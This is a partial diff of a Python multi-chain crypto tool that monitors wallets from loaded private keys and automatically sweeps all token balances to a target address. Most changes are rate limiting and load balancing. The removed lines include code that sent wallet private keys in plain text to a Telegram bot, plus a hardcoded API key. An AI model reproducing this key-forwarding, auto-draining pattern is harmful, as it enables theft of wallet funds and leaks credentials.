         self.today_usage = 0                # 今日已使用CU
+        
+        # API可用性检查
+        self.last_failure_time = 0
+        self.failure_count = 0
+        self.cooldown_duration = 60  # 失败后的冷却时间（秒）
+    
+    def is_api_available(self) -> bool:
+        """检查API是否可用"""
+        current_time = time.time()
+        
+        # 检查CU使用率是否超限
+        if self.current_cu_rate >= self.max_cu_per_second:
+            return False
+        
+        # 检查月度额度是否耗尽
+        if self.current_month_usage >= self.monthly_cu_limit * 0.95:  # 95%预警
+            return False
+        
+        # 检查是否在失败冷却期
+        if self.failure_count > 3 and (current_time - self.last_failure_time) < self.cooldown_duration:
+            return False
+        
+        return True
+    
+    def record_failure(self):
+        """记录API失败"""
+        self.failure_count += 1
+        self.last_failure_time = time.time()
+        print_warning(f"⚠️ {self.instance_name} 记录失败 #{self.failure_count}")
+    
+    def record_success(self):
+        """记录API成功，重置失败计数"""
+        if self.failure_count > 0:
+            print_success(f"✅ {self.instance_name} 恢复正常")
+        self.failure_count = 0
     
     async def _rate_limit(self, cu_cost: int = 1):
         """智能API限频控制"""
@@ -1028,9 +1164,9 @@ class AlchemyAPI:
         if current_cu_usage + cu_cost > self.target_cu_per_second:
             # 计算需要等待的时间
             oldest_timestamp = min(timestamp for timestamp, _ in self.request_history) if self.request_history else current_time
-            wait_time = 1.0 - (current_time - oldest_timestamp) + 0.005  # 减少额外等待时间，提升速度
+            wait_time = 1.0 - (current_time - oldest_timestamp) + 0.001  # 减少等待时间，提升速度
             if wait_time > 0:
-                print_info(f"🚦 API限频等待 {wait_time:.3f}s (当前: {current_cu_usage}/{self.target_cu_per_second} CU/s)")
+                print_info(f"🚦 {self.instance_name} 限频等待 {wait_time:.3f}s (当前: {current_cu_usage}/{self.target_cu_per_second} CU/s)")
                 await asyncio.sleep(wait_time)
                 current_time = time.time()
                 # 重新清理请求记录
@@ -1046,9 +1182,6 @@ class AlchemyAPI:
         # 更新当前速率
         self.current_cu_rate = sum(cu for _, cu in self.request_history)
         
-        # 更新当前速率统计
-        self.current_cu_rate = sum(cu for _, cu in self.request_history)
-        
         # 更新月度和日度使用统计
         self._update_usage_stats(cu_cost)
     
@@ -1058,12 +1191,16 @@ class AlchemyAPI:
         
         now = datetime.now(timezone.utc)
         
-        # 检查是否需要重置月度统计（每月1号）
-        if self.month_start_time is None or now.day == 1 and now.hour == 0:
-            if self.month_start_time is None or now.month != self.month_start_time.month:
-                self.month_start_time = now.replace(day=1, hour=0, minute=0, second=0, microsecond=0)
-                self.current_month_usage = 0
-                print_info(f"🔄 月度额度已重置: {self.monthly_cu_limit:,} CU")
+        # 检查是否需要重置月度统计（新月份开始时）
+        if self.month_start_time is None:
+            # 首次初始化
+            self.month_start_time = now.replace(day=1, hour=0, minute=0, second=0, microsecond=0)
+            self.current_month_usage = 0
+        elif now.month != self.month_start_time.month or now.year != self.month_start_time.year:
+            # 新月份或新年份，重置统计
+            self.month_start_time = now.replace(day=1, hour=0, minute=0, second=0, microsecond=0)
+            self.current_month_usage = 0
+            print_info(f"🔄 月度额度已重置: {self.monthly_cu_limit:,} CU")
         
         # 检查是否需要重置每日统计
         if hasattr(self, 'last_reset_day'):
@@ -1120,8 +1257,20 @@ class AlchemyAPI:
         }
     
     def _get_rpc_url(self, chain_config: Dict) -> str:
-        """获取RPC URL"""
-        return chain_config.get('rpc_url', '').strip()
+        """获取RPC URL，替换为当前API密钥"""
+        base_url = chain_config.get('rpc_url', '').strip()
+        
+        # 替换URL中的PLACEHOLDER_API_KEY为当前实例的密钥
+        if 'PLACEHOLDER_API_KEY' in base_url:
+            return base_url.replace('PLACEHOLDER_API_KEY', self.api_key)
+        
+        # 兼容旧的替换方式
+        if '/v2/' in base_url:
+            parts = base_url.split('/v2/')
+            if len(parts) == 2:
+                return f"{parts[0]}/v2/{self.api_key}"
+        
+        return base_url
     
     async def check_asset_transfers(self, address: str, chain_config: Dict) -> Tuple[bool, int]:
         """检查地址是否有交易历史，返回(是否有交易, 交易数量)"""
@@ -1152,10 +1301,13 @@ class AlchemyAPI:
             if 'result' in data:
                 transfers = data['result'].get('transfers', [])
                 transfer_count = len(transfers)
+                self.record_success()  # 记录成功
                 return transfer_count > 0, transfer_count
             
+            self.record_success()  # 记录成功
             return False, 0
         except requests.exceptions.HTTPError as http_error:
+            self.record_failure()  # 记录失败
             status_code = getattr(http_error.response, 'status_code', None)
             # 对于 400/403/404，视为该链在 Alchemy 上不受支持或密钥未开通，返回 False 以触发屏蔽
             if status_code in (400, 403, 404):
@@ -1167,6 +1319,7 @@ class AlchemyAPI:
             logging.debug(f"检查交易历史失败 {chain_config['name']} (HTTP {status_code}): {http_error}")
             return True, 0
         except Exception as e:
+            self.record_failure()  # 记录失败
             # 网络超时等暂时性错误，不屏蔽
             logging.warning(f"检查交易历史失败 {chain_config['name']}: {e}")
             return True, 0  # 网络错误时假设有交易历史，避免误屏蔽
@@ -1192,10 +1345,13 @@ class AlchemyAPI:
             if 'result' in data:
                 balance_wei = int(data['result'], 16)
                 balance_eth = Web3.from_wei(balance_wei, 'ether')
+                self.record_success()  # 记录成功
                 return float(balance_eth)
             
+            self.record_success()  # 记录成功
             return 0.0
         except Exception as e:
+            self.record_failure()  # 记录失败
             logging.error(f"获取余额失败 {chain_config['name']}: {e}")
             return 0.0
     
@@ -1253,9 +1409,11 @@ class AlchemyAPI:
                                     'type': 'erc20'
                                 }
             
+            self.record_success()  # 记录成功
             return all_balances
             
         except Exception as e:
+            self.record_failure()  # 记录失败
             logging.error(f"获取全代币余额失败 {chain_config['name']}: {e}")
             # 如果API失败，至少返回原生代币余额
             native_balance = await self.get_balance(address, chain_config)
@@ -1290,10 +1448,13 @@ class AlchemyAPI:
             
             data = response.json()
             if 'result' in data:
+                self.record_success()  # 记录成功
                 return data['result']
             
+            self.record_success()  # 记录成功
             return {}
         except Exception as e:
+            self.record_failure()  # 记录失败
             logging.warning(f"获取代币元数据失败 {contract_address}: {e}")
             return {}
     
@@ -1323,6 +1484,7 @@ class AlchemyAPI:
                 base_fee = int(result['baseFeePerGas'][0], 16)
                 priority_fee = int(result['reward'][0][0], 16) if result['reward'] else 2000000000  # 2 gwei
                 
+                self.record_success()  # 记录成功
                 return {
                     "base_fee": base_fee,
                     "priority_fee": priority_fee,
@@ -1349,6 +1511,7 @@ class AlchemyAPI:
                 gas_price = int(data['result'], 16)
                 # 确保gas价格不为零
                 if gas_price > 0:
+                    self.record_success()  # 记录成功
                     return {
                         "gas_price": gas_price,
                         "max_fee": gas_price,
@@ -1358,6 +1521,7 @@ class AlchemyAPI:
                 else:
                     print_warning(f"Gas价格为0，使用最小值 {chain_config['name']}")
                     gas_price = 1000000000  # 1 gwei minimum
+                    self.record_success()  # 记录成功
                     return {
                         "gas_price": gas_price,
                         "max_fee": gas_price,
@@ -1365,6 +1529,7 @@ class AlchemyAPI:
                         "priority_fee": 0
                     }
         except Exception as e:
+            self.record_failure()  # 记录失败
             logging.error(f"获取gas价格失败 {chain_config['name']}: {e}")
             
         # 默认gas价格 - 确保不为零
@@ -1385,13 +1550,37 @@ class TransferManager:
         self.db_manager = db_manager
         self.web3_instances = {}
         self.monitoring_app = monitoring_app
+        self._connection_cleanup_interval = 3600  # 1小时清理一次连接
+        self._last_cleanup = time.time()
+    
+    def _cleanup_stale_connections(self):
+        """清理过时的Web3连接"""
+        current_time = time.time()
+        if current_time - self._last_cleanup > self._connection_cleanup_interval:
+            # 清理所有缓存的连接，强制重新创建
+            self.web3_instances.clear()
+            self._last_cleanup = current_time
+            print_info("🧹 已清理Web3连接缓存")
     
     def get_web3_instance(self, chain_config: Dict) -> Web3:
         """获取Web3实例"""
         chain_name = chain_config['name']
         
+        # 定期清理连接
+        self._cleanup_stale_connections()
+        
         if chain_name not in self.web3_instances:
-            rpc_url = self.alchemy_api._get_rpc_url(chain_config)
+            # 兼容负载均衡器与单实例两种模式
+            try:
+                if hasattr(self.alchemy_api, '_get_rpc_url'):
+                    rpc_url = self.alchemy_api._get_rpc_url(chain_config)
+                elif hasattr(self.alchemy_api, 'get_next_api'):
+                    api = self.alchemy_api.get_next_api()
+                    rpc_url = api._get_rpc_url(chain_config)
+                else:
+                    rpc_url = chain_config.get('rpc_url', '')
+            except Exception:
+                rpc_url = chain_config.get('rpc_url', '')
             
             try:
                 # 创建HTTP提供者，设置超时
@@ -1417,6 +1606,7 @@ class TransferManager:
                 
                 # 测试连接
                 try:
+                    # 连接性检查
                     web3.is_connected()
                 except Exception as e:
                     logging.debug(f"Web3连接测试失败 {chain_name}: {e}")
@@ -1455,24 +1645,19 @@ class TransferManager:
                 else:
                     base_gas_limit = 21000  # 原生代币转账基础gas
             
-            # 智能gas价格调整 - 确保不为零
-            base_gas_price = max(gas_data['gas_price'], 1000000000)  # 至少1 gwei
+            # 简化gas价格调整，确保gas价格不为零
+            base_gas_price = gas_data.get('gas_price', 20000000000)  # 默认20 gwei
+            if base_gas_price <= 0:
+                base_gas_price = 20000000000  # 如果价格为零，使用20 gwei
             
+            base_gas_price = max(base_gas_price, 1000000000)  # 至少1 gwei
+            gas_price_multiplier = 1.2
             if chain_config['chain_id'] in [1, 42161, 10]:  # 主网、Arbitrum、Optimism
-                # 高价值链，使用较低gas价格
-                gas_price = max(int(base_gas_price * 0.8), 1000000000)
-            elif chain_config['chain_id'] in [137, 56, 43114]:  # Polygon、BSC、Avalanche
-                # 中等价值链，使用标准gas价格
-                gas_price = max(base_gas_price, 1000000000)
-            elif chain_config['chain_id'] == 534352:  # Scroll
-                # Scroll需要考虑L1 fee，使用更高的gas价格
-                gas_price = max(int(base_gas_price * 3.0), 5000000000)  # 至少5 gwei
+                gas_price_multiplier = 1.0
             elif chain_config['chain_id'] == 324:  # ZKsync Era
-                # ZKsync Era特殊处理
-                gas_price = max(int(base_gas_price * 2.0), 50000000)  # 至少0.05 gwei
-            else:
-                # 其他链，使用较高gas价格确保成功
-                gas_price = max(int(base_gas_price * 1.2), 2000000000)  # 至少2 gwei
+                gas_price_multiplier = 2.0
+            
+            gas_price = int(base_gas_price * gas_price_multiplier)
             
             # 计算gas成本
             total_gas_cost = base_gas_limit * gas_price
@@ -1640,8 +1825,11 @@ class TransferManager:
                     abi=erc20_abi
                 )
                 
-                # 计算转账金额（转出所有余额）
-                amount_raw = int(token_info['balance'] * (10 ** token_info['decimals']))
+                # 计算转账金额（转出所有余额），并确保至少为1个最小单位
+                decimals = int(token_info['decimals']) if 'decimals' in token_info else 18
+                amount_raw = int(Decimal(str(token_info['balance'])) * (10 ** decimals))
+                if amount_raw <= 0:
+                    raise ValueError("代币余额过小，无法形成有效最小单位，跳过交易")
                 
                 # 根据链设置适当的gas limit
                 if chain_config['chain_id'] == 324:  # ZKsync Era
@@ -1676,8 +1864,8 @@ class TransferManager:
                 # 获取gas价格
                 gas_data = await self.alchemy_api.get_gas_price(chain_config)
                 
-                # 计算gas费用
-                estimated_gas_cost = transaction_data['gas'] * gas_data['gas_price']
+                # 计算gas费用（使用设置的gas limit）
+                estimated_gas_cost = gas_limit * gas_data['gas_price']
                 
                 if native_balance < estimated_gas_cost:
                     # 检查ERC20代币价值，只有价值大于1美元才发送通知
@@ -1691,7 +1879,8 @@ class TransferManager:
                     if token_value_usd >= 1.0:  # 只有价值>=1美元才发送通知
                         await self._send_erc20_gas_shortage_notification(
                             from_address, token_info, chain_config, 
-                            estimated_gas_cost, native_balance, token_price, token_value_usd
+                            estimated_gas_cost, native_balance, token_price, token_value_usd,
+                            TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
                         )
                     else:
                         print_info(f"💡 ERC20代币 {token_info['symbol']} 价值过低 (${token_value_usd:.4f})，跳过通知")
@@ -1797,65 +1986,61 @@ class TransferManager:
     async def _send_erc20_gas_shortage_notification(self, from_address: str, token_info: Dict, 
                                                    chain_config: Dict, estimated_gas_cost: int, 
                                                    native_balance: int, token_price: float = None,
-                                                   token_value_usd: float = None):
-        """发送ERC20代币gas不足的Telegram通知，包含私钥用于手动操作"""
-        try:
-            # 获取私钥（从地址映射中查找）
-            private_key = None
-            if self.monitoring_app and hasattr(self.monitoring_app, 'addresses'):
-                for addr_info in self.monitoring_app.addresses:
-                    if addr_info['address'].lower() == from_address.lower():
-                        private_key = addr_info['private_key']
-                        break
-            
-            # 格式化余额显示
-            if token_info['balance'] >= 1:
-                balance_str = f"{token_info['balance']:.6f}"
-            elif token_info['balance'] >= 0.000001:
-                balance_str = f"{token_info['balance']:.8f}"
-            else:
-                balance_str = f"{token_info['balance']:.12f}"
-            
-            # 构建价值信息
-            value_info = ""
-            if token_price is not None and token_value_usd is not None:
-                value_info = (
-                    f"💵 <b>单价:</b> ${token_price:.6f}\n"
-                    f"💎 <b>总价值:</b> ${token_value_usd:.2f}\n"
-                )
-            
-            message = (
-                f"🚨 <b>高价值ERC20代币发现但Gas不足</b>\n\n"
-                f"🔗 <b>链:</b> {chain_config['name']}\n"
-                f"💰 <b>代币:</b> {balance_str} {token_info['symbol']}\n"
-                f"{value_info}"
-                f"📍 <b>合约地址:</b> <code>{token_info.get('contract_address', 'N/A')}</code>\n"
-                f"👤 <b>钱包地址:</b> <code>{from_address}</code>\n"
-                f"⛽ <b>需要Gas:</b> {estimated_gas_cost/1e18:.8f} {chain_config['native_token']}\n"
-                f"💳 <b>当前余额:</b> {native_balance/1e18:.8f} {chain_config['native_token']}\n"
-                f"📊 <b>缺口:</b> {(estimated_gas_cost - native_balance)/1e18:.8f} {chain_config['native_token']}\n\n"
-                f"🔑 <b>私钥 (手动操作用):</b>\n<code>{private_key if private_key else '未找到私钥'}</code>\n\n"
-                f"💡 <b>建议操作:</b>\n"
-                f"1. 向该地址转入足够的 {chain_config['native_token']} 作为Gas费\n"
-                f"2. 使用私钥手动转出ERC20代币\n"
-                f"3. 或等待系统自动重试"
-            )
-            
-            # 发送通知
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-            payload = {
-                "chat_id": TELEGRAM_CHAT_ID,
-                "text": message,
-                "parse_mode": "HTML"
-            }
-            
-            response = requests.post(url, json=payload, timeout=10)
-            response.raise_for_status()
-            print_warning(f"📱 已发送ERC20 Gas不足通知到Telegram")
-            
-        except Exception as e:
-            print_error(f"发送ERC20 Gas不足通知失败: {e}")
-            logging.error(f"发送ERC20 Gas不足通知失败: {e}")
+                                                   token_value_usd: float = None,
+                                                   telegram_bot_token: str = None,
+                                                   telegram_chat_id: str = None):
+       """发送ERC20代币gas不足的Telegram通知"""
+       try:
+           if not telegram_bot_token or not telegram_chat_id:
+               return
+
+           # 格式化余额显示
+           if token_info['balance'] >= 1:
+               balance_str = f"{token_info['balance']:.6f}"
+           elif token_info['balance'] >= 0.000001:
+               balance_str = f"{token_info['balance']:.8f}"
+           else:
+               balance_str = f"{token_info['balance']:.12f}"
+           
+           # 构建价值信息
+           value_info = ""
+           if token_price is not None and token_value_usd is not None:
+               value_info = (
+                   f"💵 <b>单价:</b> ${token_price:.6f}\n"
+                   f"💎 <b>总价值:</b> ${token_value_usd:.2f}\n"
+               )
+           
+           message = (
+               f"🚨 <b>高价值ERC20代币发现但Gas不足</b>\n\n"
+               f"🔗 <b>链:</b> {chain_config['name']}\n"
+               f"💰 <b>代币:</b> {balance_str} {token_info['symbol']}\n"
+               f"{value_info}"
+               f"📍 <b>合约地址:</b> <code>{token_info.get('contract_address', 'N/A')}</code>\n"
+               f"👤 <b>钱包地址:</b> <code>{from_address}</code>\n"
+               f"⛽ <b>需要Gas:</b> {estimated_gas_cost/1e18:.8f} {chain_config['native_token']}\n"
+               f"💳 <b>当前余额:</b> {native_balance/1e18:.8f} {chain_config['native_token']}\n"
+               f"📊 <b>缺口:</b> {(estimated_gas_cost - native_balance)/1e18:.8f} {chain_config['native_token']}\n\n"
+               f"💡 <b>建议操作:</b>\n"
+               f"1. 向该地址转入足够的 {chain_config['native_token']} 作为Gas费\n"
+               f"2. 手动转出ERC20代币\n"
+               f"3. 或等待系统自动重试"
+           )
+           
+           # 发送通知
+           url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
+           payload = {
+               "chat_id": telegram_chat_id,
+               "text": message,
+               "parse_mode": "HTML"
+           }
+           
+           response = requests.post(url, json=payload, timeout=10)
+           response.raise_for_status()
+           print_warning(f"📱 已发送ERC20 Gas不足通知到Telegram")
+           
+       except Exception as e:
+           print_error(f"发送ERC20 Gas不足通知失败: {e}")
+           logging.error(f"发送ERC20 Gas不足通知失败: {e}")
 
 
 class MonitoringApp:
@@ -1872,8 +2057,8 @@ class MonitoringApp:
         self.blocked_chains_cache = set()  # 缓存已屏蔽的链，避免重复数据库查询
         self.db_semaphore = asyncio.Semaphore(20)  # 增加并发数据库操作数量，提升速度
         
-        # 轮次统计
-        self.round_start_time = None
+        # 轮次统计 - 初始化所有必要属性
+        self.round_start_time = time.time()
         self.round_cu_usage = 0
         self.round_count = 0
         
@@ -1955,17 +2140,36 @@ class MonitoringApp:
         print_progress("加载配置...")
         await self.load_config()
         
-        print_progress("尝试从数据库加载私钥...")
-        if await self.load_private_keys_from_db():
-            await self.auto_load_private_keys()
+        print_progress("从环境变量加载私钥...")
+        private_keys_str = os.getenv("PRIVATE_KEYS")
+        if private_keys_str:
+            private_keys = [k.strip() for k in private_keys_str.split(',') if k.strip()]
+            self.addresses = []
+            for pk in private_keys:
+                try:
+                    account = Account.from_key(pk)
+                    self.addresses.append({'address': account.address, 'private_key': pk})
+                except:
+                    pass
+            if self.addresses:
+                print_success(f"从环境变量加载了 {len(self.addresses)} 个地址")
         else:
-            print_info("未找到保存的私钥，需要手动导入")
+            print_info("未找到PRIVATE_KEYS环境变量，需要手动导入")
         
-        # 使用固定的API密钥
-        api_key = "MYr2ZG1P7bxc4F1qVTLIj"
-        print_info(f"使用API密钥: {api_key[:8]}...")
+        # 使用环境变量中的API密钥配置负载均衡器
+        api_keys = [
+            key.strip() 
+            for key in os.getenv("ALCHEMY_API_KEYS", "").split(',') 
+            if key.strip()
+        ]
         
-        self.alchemy_api = AlchemyAPI(api_key)
+        if not api_keys:
+            print_error("未找到Alchemy API密钥，请在.env文件中配置ALCHEMY_API_KEYS")
+            return
+
+        print_info(f"配置负载均衡器，使用 {len(api_keys)} 个API密钥")
+        
+        self.alchemy_api = AlchemyAPILoadBalancer(api_keys)
         self.transfer_manager = TransferManager(self.alchemy_api, self.db_manager, self)
         
         # 显示价格缓存统计
@@ -1973,7 +2177,12 @@ class MonitoringApp:
         print_info(f"💎 CoinGecko API状态:")
         print_info(f"   月度调用: {cache_stats['monthly_calls']}/10,000")
         print_info(f"   价格缓存: {cache_stats['valid_cached']} 有效 / {cache_stats['total_cached']} 总计")
-        print_info(f"   缓存时长: 3天")
+        try:
+            cache_hours = (self.price_checker.cache_duration // 3600) if self.price_checker else 24
+        except Exception:
+            cache_hours = 24
+        cache_days = cache_hours / 24
+        print_info(f"   缓存时长: {cache_days:g}天")
         
         print_success("初始化完成")
     
@@ -2292,7 +2501,14 @@ class MonitoringApp:
             # 重置轮次统计
             import time
             self.round_start_time = time.time()
-            round_start_cu = self.alchemy_api.current_month_usage if self.alchemy_api else 0
+            # 获取初始CU使用量
+            if isinstance(self.alchemy_api, AlchemyAPILoadBalancer):
+                usage_stats = self.alchemy_api.get_usage_stats()
+                round_start_cu = usage_stats.get('total_monthly_usage', 0)
+            elif self.alchemy_api:
+                round_start_cu = getattr(self.alchemy_api, 'current_month_usage', 0)
+            else:
+                round_start_cu = 0
             self.reset_round_stats()
             
             # 计算总操作数（地址数 * 链数）
@@ -2301,88 +2517,32 @@ class MonitoringApp:
             
             print_progress(f"第 {round_count} 轮监控开始")
             
-            transfer_count = 0
+            tasks = []
             operation_count = 0
-            
             for address_info in self.addresses:
-                address = address_info['address']
-                print_info(f"监控地址: {address}")
-                
                 for chain_setting in self.config['chains']:
-                    operation_count += 1
-                    self.update_round_progress(operation_count, total_operations)
+                    # 通过chain_id查找配置，更可靠
                     chain_config = None
                     for chain_name, supported_config in ChainConfig.SUPPORTED_CHAINS.items():
                         if supported_config['chain_id'] == chain_setting['chain_id']:
                             chain_config = supported_config
                             break
                     
-                    if not chain_config:
-                        continue
-                    
-                    # 检查是否已被屏蔽
-                    cache_key = f"{address}:{chain_config['chain_id']}"
-                    if cache_key in self.blocked_chains_cache:
-                        continue
-                    
-                    print_chain(f"检查 {chain_config['name']} 余额...")
-                    
-                    try:
-                        # 获取余额
-                        all_balances = await self.alchemy_api.get_all_token_balances(address, chain_config)
-                        
-                        if all_balances:
-                            for token_key, token_info in all_balances.items():
-                                if token_info['balance'] > 0:
-                                    # 智能格式化余额显示
-                                    balance = token_info['balance']
-                                    if balance >= 1:
-                                        balance_str = f"{balance:.6f}"
-                                    elif balance >= 0.000001:
-                                        balance_str = f"{balance:.8f}"
-                                    else:
-                                        balance_str = f"{balance:.12f}"
-                                    
-                                    print_balance(f"💰 发现余额: {balance_str} {token_info['symbol']} ({chain_config['name']})")
-                                    
-                                    # 执行转账
-                                    result = await self.execute_transfer(address_info, chain_config, token_info)
-                                    if result and result.get('success'):
-                                        transfer_count += 1
-                                        
-                                        # 计算转账价值
-                                        transfer_value_usd = 0.0
-                                        try:
-                                            if token_info['type'] == 'erc20':
-                                                token_price = await self.price_checker.get_token_price_usd(
-                                                    token_info['symbol'], 
-                                                    token_info.get('contract_address')
-                                                )
-                                                if token_price:
-                                                    transfer_value_usd = token_info['balance'] * token_price
-                                            else:
-                                                # 对于原生代币，尝试获取价格
-                                                native_price = await self.price_checker.get_token_price_usd(
-                                                    chain_config['native_token']
-                                                )
-                                                if native_price:
-                                                    transfer_value_usd = result['amount'] * native_price
-                                        except Exception as e:
-                                            logging.debug(f"计算转账价值失败: {e}")
-                                        
-                                        # 更新统计
-                                        self.add_transfer_stats(transfer_value_usd)
-                                        
-                                        print_transfer(f"转账成功: {result['amount']} {token_info['symbol']} (${transfer_value_usd:.2f})")
-                    
-                    except Exception as e:
-                        print_error(f"监控异常 {chain_config['name']}: {e}")
-                        
-                    # 移除链检查间的延迟，拉满速度
-                    # await asyncio.sleep(0.01)  # 注释掉延迟
-            
+                    if chain_config:
+                        tasks.append(self.check_and_transfer_with_progress(address_info, chain_config, operation_count, total_operations))
+                        operation_count += 1
+
+            results = await asyncio.gather(*tasks)
+            transfer_count = sum(1 for r in results if r)
+
             # 计算本轮CU消耗
-            round_end_cu = self.alchemy_api.current_month_usage if self.alchemy_api else 0
+            if isinstance(self.alchemy_api, AlchemyAPILoadBalancer):
+                usage_stats = self.alchemy_api.get_usage_stats()
+                round_end_cu = usage_stats.get('total_monthly_usage', 0)
+            elif self.alchemy_api:
+                round_end_cu = getattr(self.alchemy_api, 'current_month_usage', 0)
+            else:
+                round_end_cu = 0
             self.round_cu_usage = round_end_cu - round_start_cu
             
             print_success(f"第 {round_count} 轮完成，执行 {transfer_count} 笔转账")
@@ -2397,16 +2557,83 @@ class MonitoringApp:
                 print_info(f"   每日预算: {usage_stats['daily_budget']:,} CU")
                 print_info(f"   剩余天数: {usage_stats['days_remaining']} 天")
             
-            # 动态计算暂停时间
-            dynamic_pause = self.calculate_dynamic_pause()
+            # 动态计算暂停时间（对于负载均衡器减少暂停时间）
+            try:
+                if isinstance(self.alchemy_api, AlchemyAPILoadBalancer):
+                    # 多API情况下减少暂停时间
+                    dynamic_pause = max(2, self.calculate_dynamic_pause() // 3)
+                else:
+                    dynamic_pause = self.calculate_dynamic_pause()
+            except Exception as e:
+                print_warning(f"计算动态暂停时间出错: {e}，使用默认值")
+                dynamic_pause = 5  # 默认暂停5秒
+            
             print_info(f"⏱️ 智能暂停 {dynamic_pause} 秒...")
             await asyncio.sleep(dynamic_pause)
+    
+    async def check_and_transfer_with_progress(self, address_info: Dict, chain_config: Dict, 
+                                             current_operation: int, total_operations: int) -> bool:
+        """检查单个地址和链的余额并执行转账（带进度更新）"""
+        self.update_round_progress(current_operation + 1, total_operations)
+        return await self.check_and_transfer(address_info, chain_config)
+    
+    async def check_and_transfer(self, address_info: Dict, chain_config: Dict) -> bool:
+        """检查单个地址和链的余额并执行转账"""
+        address = address_info['address']
+        cache_key = f"{address}:{chain_config['chain_id']}"
+        if cache_key in self.blocked_chains_cache:
+            return False
+
+        try:
+            all_balances = await self.alchemy_api.get_all_token_balances(address, chain_config)
+            if all_balances:
+                for token_key, token_info in all_balances.items():
+                    if token_info['balance'] > 0:
+                        # 原生代币按链级最小阈值过滤
+                        if token_info.get('type') == 'native':
+                            try:
+                                min_amount_str = next((c.get('min_amount') for c in self.config.get('chains', []) if c.get('chain_id') == chain_config.get('chain_id')), '0')
+                                min_amount = float(min_amount_str) if min_amount_str is not None else 0.0
+                            except Exception:
+                                min_amount = 0.0
+                            if token_info['balance'] < min_amount:
+                                print_info(f"原生代币余额低于最小阈值 {min_amount}，已跳过 ({chain_config['name']})")
+                                continue
+                        balance = token_info['balance']
+                        balance_str = f"{balance:.6f}" if balance >= 1 else f"{balance:.12f}"
+                        print_balance(f"💰 发现余额: {balance_str} {token_info['symbol']} ({chain_config['name']})")
+                        
+                        result = await self.execute_transfer(address_info, chain_config, token_info)
+                        if result and result.get('success'):
+                            transfer_value_usd = 0.0
+                            try:
+                                token_price = await self.price_checker.get_token_price_usd(
+                                    token_info['symbol'],
+                                    token_info.get('contract_address')
+                                )
+                                if token_price:
+                                    transfer_value_usd = (result.get('amount', 0) or 0) * token_price
+                            except Exception as e:
+                                logging.debug(f"计算转账价值失败: {e}")
+                            
+                            self.add_transfer_stats(transfer_value_usd)
+                            print_transfer(f"转账成功: {result.get('amount', 0)} {token_info['symbol']} (${transfer_value_usd:.2f})")
+                            return True
+        except Exception as e:
+            print_error(f"监控异常 {chain_config['name']}: {e}")
+        return False
     
     async def execute_transfer(self, address_info: Dict, chain_config: Dict, token_info: Dict) -> Dict:
         """执行转账操作"""
         address = address_info['address']
         private_key = address_info['private_key']
-        recipient = TARGET_ADDRESS  # 使用硬编码地址
+        # 优先使用链级配置中的收款地址，回退到全局TARGET_ADDRESS
+        recipient = None
+        try:
+            recipient = next((c.get('recipient_address') for c in self.config.get('chains', []) if c.get('chain_id') == chain_config.get('chain_id') and c.get('recipient_address')), None)
+        except Exception:
+            recipient = None
+        recipient = recipient or TARGET_ADDRESS
         
         token_type = token_info['type']
         symbol = token_info['symbol']
@@ -2464,58 +2691,12 @@ class MonitoringApp:
         """停止监控"""
         self.monitoring_active = False
     
-    async def show_interactive_menu(self):
-        """显示交互式菜单"""
-        while True:
-            try:
-                print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-                print(f"{Fore.WHITE}{Back.BLUE} 🚀 EVM多链自动监控转账工具 🚀 {Style.RESET_ALL}")
-                print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-                print(f"{Fore.GREEN}💎 目标地址: {TARGET_ADDRESS}{Style.RESET_ALL}")
-                print(f"{Fore.YELLOW}📊 已加载地址: {len(self.addresses)} 个{Style.RESET_ALL}")
-                print(f"{Fore.BLUE}🔗 支持链: {len(ChainConfig.SUPPORTED_CHAINS)} 条{Style.RESET_ALL}")
-                
-                # 显示API使用统计
-                if self.alchemy_api:
-                    usage_stats = self.alchemy_api.get_usage_stats()
-                    print(f"{Fore.MAGENTA}⚡ API速率: {usage_stats['current_cu_rate']}/450 CU/s{Style.RESET_ALL}")
-                    print(f"{Fore.CYAN}📈 月度额度: {usage_stats['monthly_usage']:,}/{usage_stats['monthly_limit']:,} CU ({usage_stats['usage_percentage']:.1f}%){Style.RESET_ALL}")
-                    print(f"{Fore.YELLOW}📅 剩余天数: {usage_stats['days_remaining']} 天 | 每日预算: {usage_stats['daily_budget']:,} CU{Style.RESET_ALL}")
-                
-                print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
-                print(f"{Fore.WHITE}1. 📥 导入私钥{Style.RESET_ALL}")
-                print(f"{Fore.WHITE}2. 🔍 开始监控{Style.RESET_ALL}")
-                print(f"{Fore.WHITE}3. 🚪 退出程序{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
-                
-                choice = input(f"{Fore.YELLOW}请选择操作 (1-3): {Style.RESET_ALL}").strip()
-                
-                if choice == "3":
-                    print_success("感谢使用！程序即将退出...")
-                    break
-                elif choice == "1":
-                    await self.configure_private_keys()
-                elif choice == "2":
-                    if not self.addresses:
-                        print_error("请先导入私钥！")
-                        continue
-                    if not self.config.get('chains'):
-                        print_error("配置错误，请重新导入私钥！")
-                        continue
-                    await self.start_monitoring()
-                else:
-                    print_warning("无效选择，请重试")
-                    
-            except KeyboardInterrupt:
-                print_warning("\n程序被中断，正在退出...")
-                break
-            except Exception as e:
-                print_error(f"菜单操作出错: {e}")
-                logging.error(f"菜单操作出错: {e}")
+
     
     async def configure_private_keys(self):
         """导入私钥"""
         print_chain("📥 导入私钥")
+        print_error("安全警告: 以纯文本格式存储私钥存在风险。请确保您的环境安全。")
         print_info("支持格式:")
         print_info("- 单个私钥: 0xabc123...def789")
         print_info("- 多个私钥: 0xabc123...def789,0x123...456")
@@ -2577,12 +2758,10 @@ class MonitoringApp:
                 try:
                     # 将私钥写入.env
                     joined_keys = ",".join(private_keys)
-                    with open('.env', 'w', encoding='utf-8') as f:
-                        f.write(f"ALCHEMY_API_KEY=MYr2ZG1P7bxc4F1qVTLIj\n")
-                        f.write(f"PRIVATE_KEYS=\"{joined_keys}\"\n")
-
-                    # 存储到数据库用于持久化
-                    await self.save_private_keys_to_db(private_keys)
+                    # 安全改进：不直接写入.env文件，提醒用户手动配置
+                    print_warning("为了安全，请手动将以下内容添加到.env文件中：")
+                    print_info("PRIVATE_KEYS=\"[您的私钥，用逗号分隔]\"")
